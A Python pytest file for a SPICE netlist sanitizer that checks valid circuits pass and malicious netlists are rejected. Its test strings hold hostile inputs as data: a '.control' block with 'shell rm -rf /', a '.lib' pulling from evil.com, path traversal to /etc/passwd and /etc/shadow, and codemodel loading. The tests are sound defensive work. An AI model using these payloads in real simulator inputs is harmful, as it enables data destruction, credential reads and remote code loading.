"""Sanitizer tests -- the most important tests in the project.

Each attack fixture covers a specific threat vector. Do not weaken these tests.
See tests/fixtures/README.md for the threat model each fixture covers.
"""

import pytest
from pathlib import Path

from spicemcp.core.sanitizer import ViolationType, sanitize

FIXTURES = Path(__file__).parent / "fixtures"
SAMPLE_MODELS = FIXTURES / "sample_models"


# ---------------------------------------------------------------------------
# Valid netlists -- must pass with zero violations
# ---------------------------------------------------------------------------

@pytest.mark.parametrize("filename", [
    "valid_rc_filter.net",
    "valid_ac_analysis.net",
    "valid_op_analysis.net",
    "legitimate_system_comment.net",
])
def test_valid_netlists_accepted(filename):
    result = sanitize((FIXTURES / filename).read_text())
    assert result.accepted, f"Expected {filename} to pass, got violations: {result.violations}"
    assert result.violations == []


# ---------------------------------------------------------------------------
# Attack vectors -- each must be caught with the correct ViolationType
# ---------------------------------------------------------------------------

@pytest.mark.parametrize("filename,expected_type", [
    ("malicious_control_block.net",           ViolationType.CONTROL_BLOCK),
    ("malicious_control_block_uppercase.net",  ViolationType.CONTROL_BLOCK),
    ("malicious_lib_url_http.net",            ViolationType.LIB_URL),
    ("malicious_lib_url_https.net",           ViolationType.LIB_URL),
    ("malicious_unixcom.net",                 ViolationType.UNIXCOM),
    ("malicious_path_traversal.net",          ViolationType.PATH_TRAVERSAL),
    ("malicious_codemodel.net",               ViolationType.CODEMODEL),
    ("malicious_verilog_dll.net",             ViolationType.VERILOG_DLL),
    ("malicious_dll_reference.net",           ViolationType.VERILOG_DLL),
])
def test_attack_vectors_rejected(filename, expected_type):
    result = sanitize((FIXTURES / filename).read_text())
    assert not result.accepted, f"Expected {filename} to be rejected"
    types = {v.type for v in result.violations}
    assert expected_type in types, (
        f"Expected violation type {expected_type} in {filename}, got {types}"
    )


# ---------------------------------------------------------------------------
# False positive tests (D-02) -- 'system' and 'shell' must not fire
# ---------------------------------------------------------------------------

def test_system_in_comment_not_flagged():
    netlist = "* This system uses a Colpitts oscillator\nR1 in out 1k\n.tran 1u\n"
    result = sanitize(netlist)
    assert result.accepted

def test_system_in_param_not_flagged():
    netlist = "* Test\n.param system_gain=10\nR1 in out 1k\n.tran 1u\n"
    result = sanitize(netlist)
    assert result.accepted

def test_shell_in_component_name_not_flagged():
    netlist = "* Test\nXshell_driver in out MYMODEL\nR1 in out 1k\n.tran 1u\n"
    result = sanitize(netlist)
    assert result.accepted

def test_system_in_subckt_name_not_flagged():
    netlist = (
        "* Test\n"
        ".subckt system_filter in out\n"
        "R1 in out 1k\n"
        ".ends system_filter\n"
        ".tran 1u\n"
    )
    result = sanitize(netlist)
    assert result.accepted


# ---------------------------------------------------------------------------
# Control block edge cases
# ---------------------------------------------------------------------------

def test_control_block_content_produces_single_violation():
    """Lines inside .control block must not generate additional violations."""
    netlist = (
        "* Test\n"
        ".control\n"
        "shell rm -rf /\n"
        "set unixcom\n"
        ".endc\n"
        "R1 in out 1k\n"
        ".tran 1u\n"
    )
    result = sanitize(netlist)
    assert not result.accepted
    assert len(result.violations) == 1
    assert result.violations[0].type == ViolationType.CONTROL_BLOCK

def test_control_block_after_endc_normal_lines_pass():
    """Content after .endc is checked normally -- only the block itself is rejected."""
    netlist = (
        "* Test\n"
        ".control\n"
        "run\n"
        ".endc\n"
        "R1 in out 1k\n"
        ".tran 1u\n"
    )
    result = sanitize(netlist)
    assert not result.accepted
    assert len(result.violations) == 1

def test_control_block_reports_correct_line():
    netlist = "* Test\nR1 in out 1k\n.control\nrun\n.endc\n.tran 1u\n"
    result = sanitize(netlist)
    assert result.violations[0].line == 3

def test_control_block_stores_content():
    netlist = "* Test\n.control\n.endc\n"
    result = sanitize(netlist)
    assert result.violations[0].content == ".control"

def test_control_block_fix_mentions_meas():
    netlist = "* Test\n.control\n.endc\n"
    result = sanitize(netlist)
    fix = result.violations[0].fix
    assert "meas" in fix.lower() or "MEAS" in fix


# ---------------------------------------------------------------------------
# Multiple violations in one netlist
# ---------------------------------------------------------------------------

def test_multiple_violations_both_reported():
    netlist = (
        "* Test\n"
        ".lib http://evil.com/bad.lib\n"
        ".control\n"
        "run\n"
        ".endc\n"
        "R1 in out 1k\n"
    )
    result = sanitize(netlist)
    assert not result.accepted
    types = {v.type for v in result.violations}
    assert ViolationType.LIB_URL in types
    assert ViolationType.CONTROL_BLOCK in types


# ---------------------------------------------------------------------------
# Codemodel variants
# ---------------------------------------------------------------------------

def test_pre_codemodel_rejected():
    netlist = "* Test\n.pre_codemodel evil.cm\nR1 in out 1k\n.tran 1u\n"
    result = sanitize(netlist)
    assert not result.accepted
    assert result.violations[0].type == ViolationType.CODEMODEL

def test_load_directive_rejected():
    netlist = "* Test\n.load evil.cm\nR1 in out 1k\n.tran 1u\n"
    result = sanitize(netlist)
    assert not result.accepted
    assert result.violations[0].type == ViolationType.CODEMODEL


# ---------------------------------------------------------------------------
# Path traversal variants
# ---------------------------------------------------------------------------

def test_path_traversal_in_include():
    netlist = "* Test\n.include ../../etc/passwd\nR1 in out 1k\n.tran 1u\n"
    result = sanitize(netlist)
    assert not result.accepted
    assert result.violations[0].type == ViolationType.PATH_TRAVERSAL

def test_path_traversal_midpath():
    netlist = "* Test\n.lib models/../../../etc/shadow\nR1 in out 1k\n.tran 1u\n"
    result = sanitize(netlist)
    assert not result.accepted
    assert result.violations[0].type == ViolationType.PATH_TRAVERSAL

def test_path_traversal_quoted():
    netlist = '* Test\n.lib "../evil/model.lib"\nR1 in out 1k\n.tran 1u\n'
    result = sanitize(netlist)
    assert not result.accepted
    assert result.violations[0].type == ViolationType.PATH_TRAVERSAL


# ---------------------------------------------------------------------------
# URL variants
# ---------------------------------------------------------------------------

def test_lib_url_http_with_section_name():
    """URL .lib with a trailing section name -- path extraction must still catch the URL."""
    netlist = "* Test\n.lib http://evil.com/model.lib NMOS\nR1 in out 1k\n.tran 1u\n"
    result = sanitize(netlist)
    assert not result.accepted
    assert result.violations[0].type == ViolationType.LIB_URL


# ---------------------------------------------------------------------------
# Model reference tracking
# ---------------------------------------------------------------------------

def test_bare_filename_no_mounts_is_passthrough():
    netlist = "* Test\n.lib XBUCK360.lib\nR1 in out 1k\n.tran 1u\n"
    result = sanitize(netlist, model_dirs=[])
    assert result.accepted
    assert len(result.model_references) == 1
    assert result.model_references[0].status == "passthrough"

def test_bare_filename_found_in_mount(tmp_path):
    (tmp_path / "XBUCK360.lib").write_text("* stub")
    netlist = "* Test\n.lib XBUCK360.lib\nR1 in out 1k\n.tran 1u\n"
    result = sanitize(netlist, model_dirs=[tmp_path])
    assert result.accepted
    ref = result.model_references[0]
    assert ref.status == "found"
    assert ref.resolved_path == "/models/user_0/XBUCK360.lib"
    assert ref.host_path == str(tmp_path / "XBUCK360.lib")

def test_bare_filename_found_in_sample_models():
    result = sanitize(
        "* Test\n.lib XBUCK360.lib\nR1 in out 1k\n.tran 1u\n",
        model_dirs=[SAMPLE_MODELS],
    )
    assert result.accepted
    assert result.model_references[0].status == "found"

def test_absolute_path_in_mount_accepted_and_rewritten(tmp_path):
    model = tmp_path / "XBUCK360.lib"
    model.write_text("* stub")
    netlist = f"* Test\n.lib {model}\nR1 in out 1k\n.tran 1u\n"
    result = sanitize(netlist, model_dirs=[tmp_path])
    assert result.accepted
    ref = result.model_references[0]
    assert ref.status == "rewritten"
    assert ref.resolved_path == "/models/user_0/XBUCK360.lib"

def test_absolute_path_outside_mount_rejected(tmp_path):
    mount = tmp_path / "mount"
    mount.mkdir()
    outside = tmp_path / "outside" / "evil.lib"
    netlist = f"* Test\n.lib {outside}\nR1 in out 1k\n.tran 1u\n"
    result = sanitize(netlist, model_dirs=[mount])
    assert not result.accepted
    assert any(v.type == ViolationType.PATH_REJECTED for v in result.violations)
    assert any(r.status == "rejected" for r in result.model_references)

def test_relative_path_with_subdir_not_in_model_references():
    netlist = "* Test\n.lib subdir/model.lib\nR1 in out 1k\n.tran 1u\n"
    result = sanitize(netlist, model_dirs=[])
    assert result.accepted
    assert result.model_references == []

def test_model_reference_directive_matches_netlist_line(tmp_path):
    (tmp_path / "MyModel.lib").write_text("* stub")
    netlist = "* Test\n.lib MyModel.lib\nR1 in out 1k\n.tran 1u\n"
    result = sanitize(netlist, model_dirs=[tmp_path])
    assert result.model_references[0].directive == ".lib MyModel.lib"

def test_multiple_lib_directives_all_tracked(tmp_path):
    (tmp_path / "ModelA.lib").write_text("* stub")
    netlist = (
        "* Test\n"
        ".lib ModelA.lib\n"
        ".lib ModelB.lib\n"
        "R1 in out 1k\n"
        ".tran 1u\n"
    )
    result = sanitize(netlist, model_dirs=[tmp_path])
    assert result.accepted
    assert len(result.model_references) == 2
    statuses = {r.status for r in result.model_references}
    assert "found" in statuses
    assert "passthrough" in statuses


# ---------------------------------------------------------------------------
# SanitizeResult structure guarantees
# ---------------------------------------------------------------------------

def test_accepted_result_has_correct_fields():
    result = sanitize("* Test\nR1 in out 1k\n.tran 1u\n")
    assert result.accepted is True
    assert isinstance(result.violations, list)
    assert isinstance(result.warnings, list)
    assert isinstance(result.model_references, list)

def test_rejected_result_has_accepted_false():
    result = sanitize("* Test\n.control\n.endc\n")
    assert result.accepted is False

def test_violation_has_all_fields():
    result = sanitize("* Test\n.control\n.endc\n")
    v = result.violations[0]
    assert isinstance(v.line, int)
    assert isinstance(v.type, str)
    assert isinstance(v.content, str)
    assert isinstance(v.fix, str)
    assert v.fix
